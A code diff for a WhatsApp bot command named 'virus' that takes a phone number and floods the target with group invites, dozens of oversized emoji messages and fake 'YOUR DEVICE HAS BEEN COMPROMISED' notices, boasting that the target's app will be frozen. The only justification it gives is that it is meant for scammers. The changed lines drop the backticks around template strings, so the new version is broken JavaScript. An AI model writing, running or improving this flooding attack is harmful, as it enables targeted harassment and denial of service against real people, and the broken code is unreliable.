@@ -1,26 +1,30 @@
-const config = require('../config');
+const botConfig = require('../config');
 
 module.exports = {
   name: 'virus',
   aliases: ['bug', 'malware', 'attack', 'destroy'],
-  execute: async (sock, msg, args, from, sender, config) => {
+  execute: async (sock, msg, args, from, sender, passedConfig) => {
+    
+    // Agar function call me config nahi aayi to upar wali required config use hogi
+    const config = passedConfig || botConfig;
+    
     const number = args[0]?.replace(/[^0-9]/g, '');
     
     if (!number) {
       return await sock.sendMessage(from, {
-        text: `🦠 *VIRUS ATTACK SYSTEM* 🦠\n\n` +
-              `Usage: ${config.prefix}virus <number>\n` +
-              `Ex: ${config.prefix}virus 923*******\n\n` +
-              `⚠️ Only for scammers/blackmailers!`
+        text: 🦠 *VIRUS ATTACK SYSTEM* 🦠\n\n +
+              Usage: ${config.prefix}virus <number>\n +
+              Ex: ${config.prefix}virus 923*******\n\n +
+              ⚠️ Only for scammers/blackmailers!
       }, { quoted: msg });
     }
     
-    const jid = `${number}@s.whatsapp.net`;
+    const jid = ${number}@s.whatsapp.net;
     
     await sock.sendMessage(from, {
-      text: `🦠 *VIRUS ATTACK LAUNCHED* 🦠\n\n` +
-            `🎯 Target: ${number}\n` +
-            `⚠️ Deploying multi-vector payloads...`
+      text: 🦠 *VIRUS ATTACK LAUNCHED* 🦠\n\n +
+            🎯 Target: ${number}\n +
+            ⚠️ Deploying multi-vector payloads...
     }, { quoted: msg });
     
     // ===== REAL WORKING HEAVY PAYLOADS =====
@@ -77,11 +81,11 @@ module.exports = {
     
     // ROUND 9: Create group and spam target
     try {
-      const virusGroup = await sock.groupCreate(`🦠 VIRUS BY ${config.ownerName}`, [jid]);
+      const virusGroup = await sock.groupCreate(🦠 VIRUS BY ${config.ownerName}, [jid]);
       for (let i = 0; i < 30; i++) {
         await sock.sendMessage(virusGroup, { 
-          text: `💀 VIRUS PAYLOAD ${i+1}/30\n\n` + 
-                `🔥 NAWAB ZADA HACKER 🦅🙌\n\n` +
+          text: 💀 VIRUS PAYLOAD ${i+1}/30\n\n + 
+                🔥 NAWAB ZADA HACKER 🦅🙌\n\n +
                 '🦠'.repeat(1000)
         });
       }
@@ -90,24 +94,24 @@ module.exports = {
     // ROUND 10: Repeated join group invites
     try {
       for (let i = 0; i < 20; i++) {
-        const fakeGroup = await sock.groupCreate(`SPAM ${i}`, [jid]);
-        await sock.groupUpdateSubject(fakeGroup, `🦠 YOU ARE HACKED 🦠`);
+        const fakeGroup = await sock.groupCreate(SPAM ${i}, [jid]);
+        await sock.groupUpdateSubject(fakeGroup, 🦠 YOU ARE HACKED 🦠);
         await sock.sendMessage(fakeGroup, {
-          text: `⚠️ YOUR DEVICE HAS BEEN COMPROMISED ⚠️\n\n` +
-                `This is a security action against blackmailers.\n` +
-                `Stop harassing innocent people.\n\n` +
-                `🔥 ${config.ownerName}`
+          text: ⚠️ YOUR DEVICE HAS BEEN COMPROMISED ⚠️\n\n +
+                This is a security action against blackmailers.\n +
+                Stop harassing innocent people.\n\n +
+                🔥 ${config.ownerName}
         });
       }
     } catch(e) {}
     
     await sock.sendMessage(from, {
-      text: `✅ *VIRUS ATTACK COMPLETE* ✅\n\n` +
-            `🎯 ${number}\n` +
-            `📊 Total payloads: 50+ heavy messages\n` +
-            `📦 Groups created: 20+ spam groups\n` +
-            `💀 Target WhatsApp should be completely frozen\n\n` +
-            `🔥 ${config.ownerName}`
+      text: ✅ *VIRUS ATTACK COMPLETE* ✅\n\n +
+            🎯 ${number}\n +
+            📊 Total payloads: 50+ heavy messages\n +
+            📦 Groups created: 20+ spam groups\n +
+            💀 Target WhatsApp should be completely frozen\n\n +
+            🔥 ${config.ownerName}
     });
   }
 };
